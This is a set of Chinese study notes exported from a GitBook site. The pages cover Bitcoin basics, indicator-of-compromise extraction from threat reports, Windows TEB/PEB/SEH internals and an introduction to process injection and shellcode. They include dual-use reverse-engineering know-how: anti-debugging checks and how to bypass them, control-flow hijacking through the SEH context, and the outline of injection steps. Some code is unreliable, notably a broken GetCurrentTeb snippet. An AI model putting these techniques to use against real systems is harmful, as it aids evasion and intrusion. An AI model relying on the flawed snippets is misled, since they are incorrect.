作用：记录所有地址的所有交易（A地址-1，B地址+1这种形式），可以在任意一个地址计算出当前所拥有的比特币数量。 添加区块 比特币以“交易”为单位进行，若干条交易会组成一个区块，当P2P网络确认区块的添加之后，相应的交易就成立了。 其中头部组成为： 上一个区块区块头的hash（H2） 本区块所有交易的hash值（T2） nonce：一个任意数值 一个时间戳 如果一个节点的任意一个数据发生变化，该节点之后的所有数据都需要随之变化。 交易 从一个地址向另一个地址支付比特币的行为。 s:商店；c:顾客 s和c先通过社交或者其他手段确定身份 ---> 商店s创建 公钥B-密钥b对 并利用B生成地址B·，发给顾客c。 顾客c创建 公钥A-密钥a对 并利用A生成地址A· ---> 顾客c创建交易过程 “A·向B·支付1bitcoin” 并利用a对交易进行签名（DSA算法） ---> 顾客c将交易发布到P2P网络（向所有的比特币用户广播消息，这需要一定的手续费）。 这条交易信息和其他的信息合并到一个区块中，区块添加到区块链中。 P2P网络确认了区块，这时交易成立。 挖矿 挖矿的由来： 1、将新的区块添加到区块链 --相当于--> 创造新的比特币余额 --相当于--> 从bit矿中挖出bitcoin 2、最初，比特币协议规定每个区块奖励为50个比特币，但在减半周期结束后，这个奖励会减半为25个比特币。到2020年，这个奖励已经减半到6.25个比特币。当所有的比特币都被挖出来后，就不再产生新的比特币了。 3、矿工还可以从交易费中获得收入。每当一个比特币交易被广播到网络中时，交易发起人需要支付一定的交易费，这些费用将被添加到区块中，并成为矿工的收入之一。因此，即使区块奖励减少到零，矿工仍然可以通过收取交易费来获得收入。 奖励 因为比特币区块链称为单链，所以同一时间只能由一人进行添加，成功添加的人会获得奖励和该区块进行交易的手续费 PoW 工作量证明（Proof of Work），矿工必须证明自己的工作量以此证明区块不是被伪造的，通过散列值来证明。 添加新的区块首先需要一个合法的区块头，区块头中的“前一个区块的散列值”拥有特定格式，他的前面的若干位必须为0 为了达到这个目的就需要上面提到的那个随机数，矿工需要不断的尝试这个随机数以此达到产生合法散列值的要求。 这就可以用来证明矿工的工作量，计算的难度是由前面0的个数进行控制的。 P2P的确认 有可能同一时间多个节点计算出了正确的区块，因为p2p网络的局限性，无法得知哪一个区块先到达节点（a区块先到了张三的节点，但是b区块先到达了Mike先生的节点），具体将哪一个添加到区块链中需要p2p网络的确定。 最终选择的是计算量大的分析（假设是正义的矿工的资源大于邪恶矿工的资源） 匿名性 这里的匿名并非是绝对匿名，虽然不用每一笔交易都带上自己的电话身份证户口本，但是基于网络的交易会暴露你的ip，同时会暴露本次交易的地址（因为你向公众进行了广播），同时交易信息也是摆在明面上的。 安全性（信任） 交易安全 你给对面钱了之后，对面跑路了，没辙，因为没有中心无法追责 虽然没有中心，但是为了减少时间差和方便流通，依旧存在各种交易所，交易所卷钱跑路 --》没辙 系统安全 你的钱包被盗了，或者安装了木马性质的软件导致密钥丢失，活该没辙 参考 《图解密码技术》 chatgpt https://www.8btc.com/books/834/masterbitcoin2cn/_book/ch10.html https://www.blockchain.com/ 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-21 23:34:25 "},"MyArticles/CyberSec/IOC-痛苦金字塔.html":{"url":"MyArticles/CyberSec/IOC-痛苦金字塔.html","title":"从痛苦金字塔学习分析报告","keywords":"","body":" 痛苦金字塔简单，主要是学习如何学习一篇一次攻击的分析报告。利用一个中长篇的分析报告来学习 Bvp47-美国NSA方程式组织的顶级后门 从报告中各取所需 报告分析 1、分类 首先根据目录和简介对报告进行按照内容进行分类。 分类之后根据所分的类进行归纳总结。 事件层面 统述了事情发展的开始-中间-结束。主要的目标是这个事件 谁是攻击者 为什么攻击（目标、目的） 是如何发现并归因的（可能不公开） 结合到痛苦金字塔，这些内容是基于IOC信息上抽象总结出来的，在金字塔顶。 因为水平较高，所以在报告中并不是总能看见他，碰运气。 技术层面 主要针对的是事件中的主要样本，相当于ctf里的wp 样本是什么 样本用什么技术实现了什么目的 样本技术中有没有新颖的地方 2、威胁情报 以 前所未见的后门 为例； 读完之后需要构建大体的流程图或者框架图。 上述流程过于概况，一般的攻击流程基本大差不差，根据内容继续精进细节 威胁情报应该具备这样的特质：具体且独特 3、情报处理 从报告中将ioc提取出来，方便聚类分析，需要注意两个问题 是否有效（易变？个性化？） 能否提取（太抽象） 样本hash 每个hash对应一个样本，可信度很高，放心提取。 私钥 一般各个程序中的私钥不会相同，因为私钥的位数太多，如果私钥一样考虑是否为恶意模仿或者同组织或者下属机构……。可以提取，置信度高，不会轻易变化。 标识码 可能某些特殊的样本会存在标识码，可以提取当作ioc，但是因为少见和格式多样，不会一起列出 IP、Domain 这个时效性特别强，需要进行研判。作为一个重要的标志，准确性并不是特别高，尤其是上古样本 文件列表 如果非常特殊且具有明显特色，可以作为特征，但是如果%temp%之类的常见目录就直接忽略即可 函数处理技巧 有效。包括样本流程、整个文件结构、样本处理手法等等。虽然他们非常抽象，但很多信息都可以从这些抽象的内容中获取。像字段结构、环境校验方法等。可以对照着报告和样本来研判一下。 4、对应到金字塔 当填充完金字塔之后，就算是情报完整了。 5、注意的是 不是所有的情报都是有效的情报， 不是所有有效情报都可以被格式化提取的。 可以被批量提取的IOC们都会有一些特征，更方便于情报分析人员进行大批量、格式化的处理。 常见的IOC类型包括：IP、域名、哈希 等。 6、工程化流程 提取ioc工具 ioc_parser：Github 的开源项目，通过正则将常见的IOC类型从报告中提取出来。 yeti：开源的威胁情报平台，内部集成了一个非常友好的报告解析系统，但平台代码本身依然存在一些小小的问题，使用时候的流畅性无法保证。 ioc来源 [Alien Vault][https://otx.alienvault.com/] 开放的威胁情报社区，有很多人将不同的国家不同地区的报告整理成一个个 pulse。可以根据报告搜索，也可以根据IOC进行搜索。 [Covert.io][http://www.covert.io/threat-intelligence/] 很多安全厂商会在发布自己报告的同时发布一份IOC列表，或者由他人二次加工后形成一个IOC库，我们通常将这种定期维护的IOC库称为Feed。有人会将各种Feed地址整理，做数据的二次集成，比方说下面的链接。 twitter：这个也是很常用的一个情报来源，可以获得分享的情报，还有其他有意思的东西。 参考 https://0x666.club/pyramidofpain2/ https://0x666.club/pyramidofpain1/ https://www.pangulab.cn/post/the_bvp47_a_top-tier_backdoor_of_us_nsa_equation_group/ 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 17:30:25 "},"MyArticles/CyberSec/PEB和TEB.html":{"url":"MyArticles/CyberSec/PEB和TEB.html","title":"TEB & PEB","keywords":"","body":"参考：《逆向工程核心原理》；chatgpt（一般都是胡扯的内容）,用gcc编译的程序怎么在Windows上安装gcc呢 直接安装https://github.com/Embarcadero/Dev-Cpp/releases/tag/v6.3 DEV-c++，然后在安装目录中就可以找到gcc的编译程序啦 TEB typedef struct _TEB { BYTE Reserved1[1952]; PVOID Reserved2[412]; PVOID TlsSlots[64]; BYTE Reserved3[8]; PVOID Reserved4[26]; PVOID ReservedForOle; PVOID Reserved5[4]; PVOID TlsExpansionSlots; } TEB; thread Environment Block 线程环境块，这是一个结构体，包含了进程运行线程的各种信息，一个进程中的每一个线程都包括一个TEB结构体，在winternl.h中可以找到结构体的描述。给出的TEB的定义相当的简单啊，要是真这么简单就行了，通过windbg查看结构体的组成成员 windbg查看 用计算器的进程来查看，首先attach上calc进程，然后输入!teb查看teb结构体的地址，然后定位到TEB，查看到详细信息 0:033> dt 0x0000007e7c4ea000 ntdll!_TEB +0x000 NtTib : _NT_TIB +0x038 EnvironmentPointer : (null) +0x040 ClientId : _CLIENT_ID +0x050 ActiveRpcHandle : (null) +0x058 ThreadLocalStoragePointer : (null) +0x060 ProcessEnvironmentBlock : 0x0000007e`7c493000 _PEB +0x068 LastErrorValue : 0 +0x06c CountOfOwnedCriticalSections : 0 +0x070 CsrClientThread : (null) +0x078 Win32ThreadInfo : (null) +0x080 User32Reserved : [26] 0 +0x0e8 UserReserved : [5] 0 +0x100 WOW32Reserved : (null) +0x108 CurrentLocale : 0x804 +0x10c FpSoftwareStatusRegister : 0 +0x110 ReservedForDebuggerInstrumentation : [16] (null) +0x190 SystemReserved1 : [30] (null) +0x280 PlaceholderCompatibilityMode : 0 '' +0x281 PlaceholderHydrationAlwaysExplicit : 0 '' +0x282 PlaceholderReserved : [10] \"\" +0x28c ProxiedProcessId : 0 +0x290 _ActivationStack : _ACTIVATION_CONTEXT_STACK +0x2b8 WorkingOnBehalfTicket : [8] \"\" +0x2c0 ExceptionCode : 0n0 +0x2c4 Padding0 : [4] \"\" +0x2c8 ActivationContextStackPointer : 0x0000007e`7c4ea290 _ACTIVATION_CONTEXT_STACK +0x2d0 InstrumentationCallbackSp : 0 +0x2d8 InstrumentationCallbackPreviousPc : 0 +0x2e0 InstrumentationCallbackPreviousSp : 0 +0x2e8 TxFsContext : 0xfffe +0x2ec InstrumentationCallbackDisabled : 0 '' +0x2ed UnalignedLoadStoreExceptions : 0 '' +0x2ee Padding1 : [2] \"\" +0x2f0 GdiTebBatch : _GDI_TEB_BATCH +0x7d8 RealClientId : _CLIENT_ID +0x7e8 GdiCachedProcessHandle : (null) +0x7f0 GdiClientPID : 0 +0x7f4 GdiClientTID : 0 +0x7f8 GdiThreadLocalInfo : (null) +0x800 Win32ClientInfo : [62] 0 +0x9f0 glDispatchTable : [233] (null) +0x1138 glReserved1 : [29] 0 +0x1220 glReserved2 : (null) +0x1228 glSectionInfo : (null) +0x1230 glSection : (null) +0x1238 glTable : (null) +0x1240 glCurrentRC : (null) +0x1248 glContext : (null) +0x1250 LastStatusValue : 0 +0x1254 Padding2 : [4] \"\" +0x1258 StaticUnicodeString : _UNICODE_STRING \"\" +0x1268 StaticUnicodeBuffer : [261] \"\" +0x1472 Padding3 : [6] \"\" +0x1478 DeallocationStack : 0x0000007e`7d100000 Void +0x1480 TlsSlots : [64] (null) +0x1680 TlsLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ] +0x1690 Vdm : (null) +0x1698 ReservedForNtRpc : (null) +0x16a0 DbgSsReserved : [2] (null) +0x16b0 HardErrorMode : 0 +0x16b4 Padding4 : [4] \"\" +0x16b8 Instrumentation : [11] (null) +0x1710 ActivityId : _GUID {00000000-0000-0000-0000-000000000000} +0x1720 SubProcessTag : (null) +0x1728 PerflibData : (null) +0x1730 EtwTraceData : (null) +0x1738 WinSockData : (null) +0x1740 GdiBatchCount : 0 +0x1744 CurrentIdealProcessor : _PROCESSOR_NUMBER +0x1744 IdealProcessorValue : 0x1010000 +0x1744 ReservedPad0 : 0 '' +0x1745 ReservedPad1 : 0 '' +0x1746 ReservedPad2 : 0x1 '' +0x1747 IdealProcessor : 0x1 '' +0x1748 GuaranteedStackBytes : 0 +0x174c Padding5 : [4] \"\" +0x1750 ReservedForPerf : (null) +0x1758 ReservedForOle : (null) +0x1760 WaitingOnLoaderLock : 0 +0x1764 Padding6 : [4] \"\" +0x1768 SavedPriorityState : (null) +0x1770 ReservedForCodeCoverage : 0 +0x1778 ThreadPoolData : (null) +0x1780 TlsExpansionSlots : (null) +0x1788 DeallocationBStore : (null) +0x1790 BStoreLimit : (null) +0x1798 MuiGeneration : 0 +0x179c IsImpersonating : 0 +0x17a0 NlsCache : (null) +0x17a8 pShimData : (null) +0x17b0 HeapData : 0 +0x17b4 Padding7 : [4] \"\" +0x17b8 CurrentTransactionHandle : (null) +0x17c0 ActiveFrame : (null) +0x17c8 FlsData : (null) +0x17d0 PreferredLanguages : (null) +0x17d8 UserPrefLanguages : (null) +0x17e0 MergedPrefLanguages : (null) +0x17e8 MuiImpersonation : 0 +0x17ec CrossTebFlags : 0 +0x17ec SpareCrossTebBits : 0y0000000000000000 (0) +0x17ee SameTebFlags : 8 +0x17ee SafeThunkCall : 0y0 +0x17ee InDebugPrint : 0y0 +0x17ee HasFiberData : 0y0 +0x17ee SkipThreadAttach : 0y1 +0x17ee WerInShipAssertCode : 0y0 +0x17ee RanProcessInit : 0y0 +0x17ee ClonedThread : 0y0 +0x17ee SuppressDebugMsg : 0y0 +0x17ee DisableUserStackWalk : 0y0 +0x17ee RtlExceptionAttached : 0y0 +0x17ee InitialThread : 0y0 +0x17ee SessionAware : 0y0 +0x17ee LoadOwner : 0y0 +0x17ee LoaderWorker : 0y0 +0x17ee SkipLoaderInit : 0y0 +0x17ee SpareSameTebBits : 0y0 +0x17f0 TxnScopeEnterCallback : (null) +0x17f8 TxnScopeExitCallback : (null) +0x1800 TxnScopeContext : (null) +0x1808 LockCount : 0 +0x180c WowTebOffset : 0n0 +0x1810 ResourceRetValue : (null) +0x1818 ReservedForWdf : (null) +0x1820 ReservedForCrt : 0 +0x1828 EffectiveContainerId : _GUID {00000000-0000-0000-0000-000000000000} 用户模式 在用户模式调试中，两个成员起到重要作用 NT_TIB TEB结构体的第一个成员，Thread Infomation Block，线程信息块 typedef struct _NT_TIB { struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; PVOID StackBase; // 线程堆栈顶 PVOID StackLimit; // 线程堆栈底 PVOID SubSystemTib; union { PVOID FiberData; DWORD Version; }; PVOID ArbitraryUserPointer; struct _NT_TIB *Self; // _NT_TIB结构体的自引用指针 } NT_TIB; ExceptionList 指向一个链表，由_EXCEPTION_REGISTRATION_RECORD结构体组成的链表。这个链表用于Windows的SEH ProcessEnvironmentBlock 指向PEB结构体 TEB的访问 在用户模式通过特定的API进行访问 Ntdll.NtCurrentTeb 返回当前线程的TEB结构体的地址，但是我在win10中的calc进程中没有找到这个函数，在win7也没有找到这个函数，用的是x64dbg。 但是通过ollydbg就可以找到这个函数，这是为什么呢？ 我懂了，只有32位的程序才会用到这个函数，64位的程序不会，这是为什么呢？ chatgpt说64位的程序使用__readgsqword函数 #include void *GetCurrentTeb() { void *teb; __readgsqword((unsigned long long*)&teb); return teb; } 这个函数的作用就是访问并返回FS寄存器的0x18的位置。 这个地址存放的内容是当前线程TEB的地址，而且等于FS段寄存器所指的段内存的基址 FS寄存器 FS寄存器用来借助SDT索引指示当前线程的TEB结构体（32位操作系统4G虚拟内存，但是这个寄存器只有16位，所以要借助SDT索引） SDT：位于内核内存区域，其地址存储在寄存器GDTR寄存器中，这个区域有实际的TEB地址。 这是x64dbg给的解释，但是不知道怎么查看FS寄存器😅。 用命令disasm fs:[0]命令来查看FS寄存器，也可以用带的计算器查看 根据《逆向工程核心原理》给出的流程图 段选择符：因为FS寄存器中实际存储的是SDT的索引，所以称为段选择符（Segment Selector） FS:[18] = TEB的起始地址，还是计算器好用 FS:[30] = PEB的起始地址 借用《逆向工程核心原理》的等式 FS:[18] = TEB.NtTib.Self = TIB的地址 = TEB的地址 FS:[0] = TEB.NtTib.ExceptionList = SEH的地址 SEH是Windows的结构化异常处理机制 PEB typedef struct _PEB { BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; BYTE Reserved4[104]; PVOID Reserved5[52]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved6[128]; PVOID Reserved7[1]; ULONG SessionId; } PEB,*PPEB; 进程环境块（process environment block），每个进程都对应一个PEB PEB内容很多，这里就记录几个书上写的吧。 PEB.BeingDebugger 函数原型： BOOL IsDebuggerPresent(); 这个 api函数在kernel32.dll中，用于判断当前进程是否处于调试状态，通过检测PEB.BeingDebugger成员来检测是否在调试进程，是返回1。 原理 通过调试这个函数，发现他的定义在kernelbase.dll中，这是因为Windows的版本问题 下图是64位的程序： 这是32位的程序 PEB.ImageBaseAddress 表示进程的ImageBase，一般用GetModuleHandle()函数来获取imagebase，返回值就是加载的基址。其实就是把PEB.BeingDebugger的内容放在eax寄存器中 PEB.Ldr 通过该成员可以直接获得该模块加载的基地址，但是我对他不感兴趣，但是他也可以应用于反调试技术。 根据书上说的，在进程被调试的时候，未使用的堆内存中全部填充着0xFEEEFEEE，证明正在被调试 【只在XP系统中有，Vista之后的系统没有这种标志】所以就无所谓了，要绕过就直接把内存都改成null就行了。 而且附加调试的进程不会存在这个情况，反正挺鸡肋的东西 PEB.ProcessHeap 和 NtGlobalFlag 这俩应用于反调试技术 PEB.ProcessHeap 指向HEAP结构体的指针 API查看 通过GetProcessHeap()这个api查看，这个api实现的思路和IsDebuggerPresent差不多 也是通过FS寄存器去定位。在正常职系那个的时候，Heap.Flags的值是2，Heap.ForceFlags的值是0。 反正patch的时候直接改回来就行。【这个东西仅限于winXP，win7就已经没了，而且附加的调试进程也不会】 NtGlobalFlag 这玩意意义也不大了，现在都win10，win11了 Windows系统异常 Structured Exception Handling：结构化 异常 处理机制；总是应用于基本的异常处理和反调试，反正学PEB和TEB，一起记录一下， 在C/C++的程序中，通过使用_try、\\_except和__finally关键字来实现 #include #include int main() { __try { // 代码块，可能会抛出异常 } __except(EXCEPTION_EXECUTE_HANDLER) { // 处理异常的代码 } return 0; } 注意 和c/c++中的try， catch异常处理是不同的，trycatch这个是C++语言的标准机制。SEH是Windows的机制 SEH仅在Windows平台上可用，而try catch可在多种平台上使用。 异常 但是我没有找到这个winnt.h这个文件中没有这些内容啊好奇怪啊，找到了，就是定义不同罢了 #define STATUS_WAIT_0 ((DWORD )0x00000000L) #define STATUS_ABANDONED_WAIT_0 ((DWORD )0x00000080L) #define STATUS_USER_APC ((DWORD )0x000000C0L) #define STATUS_TIMEOUT ((DWORD )0x00000102L) #define STATUS_PENDING ((DWORD )0x00000103L) #define DBG_EXCEPTION_HANDLED ((DWORD )0x00010001L) #define DBG_CONTINUE ((DWORD )0x00010002L) #define STATUS_SEGMENT_NOTIFICATION ((DWORD )0x40000005L) #define STATUS_FATAL_APP_EXIT ((DWORD )0x40000015L) #define DBG_REPLY_LATER ((DWORD )0x40010001L) #define DBG_TERMINATE_THREAD ((DWORD )0x40010003L) #define DBG_TERMINATE_PROCESS ((DWORD )0x40010004L) #define DBG_CONTROL_C ((DWORD )0x40010005L) #define DBG_PRINTEXCEPTION_C ((DWORD )0x40010006L) #define DBG_RIPEXCEPTION ((DWORD )0x40010007L) #define DBG_CONTROL_BREAK ((DWORD )0x40010008L) #define DBG_COMMAND_EXCEPTION ((DWORD )0x40010009L) #define DBG_PRINTEXCEPTION_WIDE_C ((DWORD )0x4001000AL) #define STATUS_GUARD_PAGE_VIOLATION ((DWORD )0x80000001L) #define STATUS_DATATYPE_MISALIGNMENT ((DWORD )0x80000002L) #define STATUS_BREAKPOINT ((DWORD )0x80000003L) #define STATUS_SINGLE_STEP ((DWORD )0x80000004L) #define STATUS_LONGJUMP ((DWORD )0x80000026L) #define STATUS_UNWIND_CONSOLIDATE ((DWORD )0x80000029L) #define DBG_EXCEPTION_NOT_HANDLED ((DWORD )0x80010001L) #define STATUS_ACCESS_VIOLATION ((DWORD )0xC0000005L) #define STATUS_IN_PAGE_ERROR ((DWORD )0xC0000006L) #define STATUS_INVALID_HANDLE ((DWORD )0xC0000008L) #define STATUS_INVALID_PARAMETER ((DWORD )0xC000000DL) #define STATUS_NO_MEMORY ((DWORD )0xC0000017L) #define STATUS_ILLEGAL_INSTRUCTION ((DWORD )0xC000001DL) #define STATUS_NONCONTINUABLE_EXCEPTION ((DWORD )0xC0000025L) #define STATUS_INVALID_DISPOSITION ((DWORD )0xC0000026L) #define STATUS_ARRAY_BOUNDS_EXCEEDED ((DWORD )0xC000008CL) #define STATUS_FLOAT_DENORMAL_OPERAND ((DWORD )0xC000008DL) #define STATUS_FLOAT_DIVIDE_BY_ZERO ((DWORD )0xC000008EL) #define STATUS_FLOAT_INEXACT_RESULT ((DWORD )0xC000008FL) #define STATUS_FLOAT_INVALID_OPERATION ((DWORD )0xC0000090L) #define STATUS_FLOAT_OVERFLOW ((DWORD )0xC0000091L) #define STATUS_FLOAT_STACK_CHECK ((DWORD )0xC0000092L) #define STATUS_FLOAT_UNDERFLOW ((DWORD )0xC0000093L) #define STATUS_INTEGER_DIVIDE_BY_ZERO ((DWORD )0xC0000094L) #define STATUS_INTEGER_OVERFLOW ((DWORD )0xC0000095L) #define STATUS_PRIVILEGED_INSTRUCTION ((DWORD )0xC0000096L) #define STATUS_STACK_OVERFLOW ((DWORD )0xC00000FDL) #define STATUS_DLL_NOT_FOUND ((DWORD )0xC0000135L) #define STATUS_ORDINAL_NOT_FOUND ((DWORD )0xC0000138L) #define STATUS_ENTRYPOINT_NOT_FOUND ((DWORD )0xC0000139L) #define STATUS_CONTROL_C_EXIT ((DWORD )0xC000013AL) #define STATUS_DLL_INIT_FAILED ((DWORD )0xC0000142L) #define STATUS_CONTROL_STACK_VIOLATION ((DWORD )0xC00001B2L) #define STATUS_FLOAT_MULTIPLE_FAULTS ((DWORD )0xC00002B4L) #define STATUS_FLOAT_MULTIPLE_TRAPS ((DWORD )0xC00002B5L) #define STATUS_REG_NAT_CONSUMPTION ((DWORD )0xC00002C9L) #define STATUS_HEAP_CORRUPTION ((DWORD )0xC0000374L) #define STATUS_STACK_BUFFER_OVERRUN ((DWORD )0xC0000409L) #define STATUS_INVALID_CRUNTIME_PARAMETER ((DWORD )0xC0000417L) #define STATUS_ASSERTION_FAILURE ((DWORD )0xC0000420L) #define STATUS_ENCLAVE_VIOLATION ((DWORD )0xC00004A2L) #define STATUS_INTERRUPTED ((DWORD )0xC0000515L) #define STATUS_THREAD_NOT_RUNNING ((DWORD )0xC0000516L) #define STATUS_ALREADY_REGISTERED ((DWORD )0xC0000718L) 这里书上就写了5个常见的异常，我也就学5个吧。 EXCEPTION__ACCESS_VIOLATION 0xC0000005L 这个异常，确实最常见，当时就是在执行汇编指令mov eax, dword ptr fs:[30]的时候，或者是upx脱壳之后的问题。 在上述文件中记录的是这个错误：STATUS_ACCESS_VIOLATION 就是试图访问没有权限的内存，或者是不存在的内存，非法的内存访问 EXCEPTION_BREAKPOINT 0x80000003L 记录的是这个STATUS_BREAKPOINT，这个非常常见，CPU执行到设置断点的位置的时候，就会发生这个异常，调试器的下断点的功能就是通过这个异常实现的《逆向工程核心原理》是这么说的啊。 通过下int3的断点（将该内存的指令改成了0xcc，但是调试器为了效率和可读性，并不显示）这里试验一下书上的办法 测试 一个exe文件 我现在把他dump出来，没有啥工具，直接用任务管理器把他dump出来 看到对应的地址，内存中的数值已经发生了改变，测试成功。 成功个p，这压根就不是那个内存，通过排查发现，并没有找到目标代码。确实找不到。 STATUS_ILLEGAL_INSTRUCTION 0xC000001D 遇到非法指令就会触发这个异常，比如执行到cpu不认识的指令 STATUS_INTEGER_DIVIDE_BY_ZERO 0xC0000094 分母为零就会触发这个异常，这个我觉得有意思可以实验一下 三行小代码，尝试一下触发异常 成功触发异常啊，调试器已经卡死了，这个地方就可以作为一个shellcode的触发点，这个视频里也讲过https://www.bilibili.com/video/BV1uY4y1q76L/?spm_id_from=333.880.my_history.page.click STATUS_SINGLE_STEP 0x80000004L 单步：SINGLE_STEP。执行一条指令然后暂停，cpu进入单步模式，每执行一条指令就触发这个异常，暂停运行。 将TF寄存器设置成1可以做到。 SEH链 SEH(Structured Exception Handling)以链的形式存在【由_EXCEPTION_REGISTRATION_RECORD结构体组成的链表】。第一个异常处理器中如果没有处理响应的异常，就按次序传递给下一个异常处理器，一个一个往下走，直到得到处理。 给出的定义是 typedef struct _EXCEPTION_REGISTRATION_RECORD { struct _EXCEPTION_REGISTRATION_RECORD *Next; //指向下一个结构的指针 PEXCEPTION_ROUTINE Handler; //当前异常处理函数的地址 }EXCEPTION_REGISTRATION_RECORD; 如果Next的值是一串f，那就是到头了。根据《逆向工程核心原理》给出的图，我看还是通用的。 异常触发的时候，异常会按照 ABC的顺序传递，直到被解决 Handler 异常处理函数（异常处理器）的定义，《逆向工程核心原理》给出了描述 接收四个参数（保存着异常的相关信息），然后返回一个枚举类型，这是由系统调用的，属于是回调函数。 参数1： 指向EXCEPTION_RECORD结构体的指针， typedef struct _EXCEPTION_RECORD { DWORD ExceptionCode; // 异常代码 DWORD ExceptionFlags; struct _EXCEPTION_RECORD *ExceptionRecord; PVOID ExceptionAddress; // 异常发生的地址 DWORD NumberParameters; ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS]; } EXCEPTION_RECORD; 参数3： 指向CONTEXT结构体的指针，这个结构体用来在多线程情况下备份CPU结构体的值。 typedef struct _CONTEXT { DWORD64 P1Home; DWORD64 P2Home; DWORD64 P3Home; DWORD64 P4Home; DWORD64 P5Home; DWORD64 P6Home; DWORD ContextFlags; DWORD MxCsr; WORD SegCs; WORD SegDs; WORD SegEs; WORD SegFs; WORD SegGs; WORD SegSs; DWORD EFlags; DWORD64 Dr0; DWORD64 Dr1; DWORD64 Dr2; DWORD64 Dr3; DWORD64 Dr6; DWORD64 Dr7; DWORD64 Rax; DWORD64 Rcx; DWORD64 Rdx; DWORD64 Rbx; DWORD64 Rsp; DWORD64 Rbp; DWORD64 Rsi; DWORD64 Rdi; DWORD64 R8; DWORD64 R9; DWORD64 R10; DWORD64 R11; DWORD64 R12; DWORD64 R13; DWORD64 R14; DWORD64 R15; DWORD64 Rip; union { XMM_SAVE_AREA32 FltSave; NEON128 Q[16]; ULONGLONG D[32]; struct { M128A Header[2]; M128A Legacy[8]; M128A Xmm0; M128A Xmm1; M128A Xmm2; M128A Xmm3; M128A Xmm4; M128A Xmm5; M128A Xmm6; M128A Xmm7; M128A Xmm8; M128A Xmm9; M128A Xmm10; M128A Xmm11; M128A Xmm12; M128A Xmm13; M128A Xmm14; M128A Xmm15; } DUMMYSTRUCTNAME; DWORD S[32]; } DUMMYUNIONNAME; M128A VectorRegister[26]; DWORD64 VectorControl; DWORD64 DebugControl; DWORD64 LastBranchToRip; DWORD64 LastBranchFromRip; DWORD64 LastExceptionToRip; DWORD64 LastExceptionFromRip; } CONTEXT, *PCONTEXT; 每一个线程内部都独立拥有这样一个结构体，当CPU取执行其他线程的时候，当前的值就会存储在这个结构体中，当cpu再回来运行的时候 ，这个结构体就将cpu重新赋值，这里也是线程劫持注入法的一个基本原理。 当异常发生时，此时的系统会把context结构体转交给异常处理函数的对应的参数。在异常处理函数中，将参数传来的context.eip（rip）的值设置为其他地址，然后返回异常处理函数，这样程序流就被劫持到了新的程序 返回值： 出处：https://www.nirsoft.net/kernel_struct/vista/EXCEPTION_DISPOSITION.html typedef enum _EXCEPTION_DISPOSITION { ExceptionContinueExecution = 0, // 继续执行异常代码 ExceptionContinueSearch = 1, // 运行下一个异常处理器 ExceptionNestedException = 2, ExceptionCollidedUnwind = 3 } EXCEPTION_DISPOSITION; 访问SEH 通过TEB结构体的NtTib成员进行访问。 windbg： > dt _teb > dt _NT_TIB 安装SEH C语言中使用__try, __except, __finally关键字可以直接添加seh，或者直接在汇编中添加。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-25 16:35:07 "},"MyArticles/CyberSec/进程注入-基础.html":{"url":"MyArticles/CyberSec/进程注入-基础.html","title":"进程注入-前置","keywords":"","body":"进程注入 在进程内存空间中执行任意代码的技术方法。通过一定方法将dll，shellcode等代码数据写入其他进程执行。这里为几个具有实战意义的注入手法。 原理 大致步骤 确定目标进程（新创建的或者打开已有进程）。 向目标进程中写入数据。 令被写入进程执行我们写入的代码数据。 相关api调用 可以注入的东西包括：一个节区，一进程，一段代码（shellcode，PE文件）或者一个dll文件。 利用Sysmon 介绍 微软中文文档：https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysmon sysmon：系统监视器 (Sysmon) 是一种 Windows 系统服务和设备驱动程序，一旦安装在系统上，在系统重新启动后仍保持驻留状态，以监视系统活动并将系统活动记录到 Windows 事件日志。 它提供有关进程创建、网络连接和文件创建时间更改的详细信息。 通过收集它使用 Windows 事件收集.aspx) 或 SIEM 代理生成的事件，然后对其进行分析，可以识别恶意活动或异常活动，并了解入侵者和恶意软件在网络上的操作方式。 下载之后解压得到： LastWriteTime Length Name 2022/9/29 20:25 7490 Eula.txt 2022/9/29 20:25 8188688 Sysmon.exe 2022/9/29 20:25 4419344 Sysmon64.exe 这里注意给的是安装文件，双击不能运行的 sysmon安装 sysmon64 -i #安装 sysmon64 -c [] #更新配置 默认配置用：sysmon64 -c -- sysmon64 -u #卸载 安装32位就不能安装64位了，所以直接安装sysmon64. sysmon使用 win+r输入：eventvwr打开事件管理器 下面找到Sysmon里的 这里就可以用了。 方便起见直接在桌面设一个快捷方式： 打开之后就可以使用这各种管理器了 ShellCode Windows的shellcode是什么，和linux的pwn里的shellcode一样是一段可执行汇编的字节码形式，一般以\\x00\\x11之类的形式存在，且有特殊目的的代码。一般是可以在目标机器上直接执行的一串机器码。 困难 shellcode定义是可以直接执行的，所以编写的时候就需要用汇编直接去写，这是人类不友好的。 还可以从已有程序中直接提取，但是会涉及到地址的问题，尤其是在现代操作系统普遍开启地址随机化之后，这是困难的。 再就是一些字符串并不在text段中，但是shellcode只包括text段的代码，所以说shellcode是有困难的。 通过loadlibrary的方式调用api函数，但是如何获得loadlibrary的地址呢？ FS寄存器 局限性 FS寄存器通常用于指向当前线程的线程本地存储（TLS）段。 TLS段是一段内存，用于存储与特定线程相关的信息。主要针对的就是32位的程序。64位的程序可以使用GS寄存器来替代。 值得注意的是，在高级语言生成的程序中例如python和C#，FS寄存器是不可用的，这是因为他们运行在虚拟机上而不是真实的CPU环境中。代码无法直接访问物理CPU的寄存器。 C#程序可以使用System.Threading命名空间中的ThreadLoca\\类来存储与特定线程相关的信息。这个类提供了一个可以为每个线程存储单独值的机制，而无需使用TLS段。例如 using System.Threading; ThreadLocal threadLocalInt = new ThreadLocal(); // 在线程A中设置threadLocalInt的值 threadLocalInt.Value = 42; // 在线程B中访问threadLocalInt的值 int value = threadLocalInt.Value; 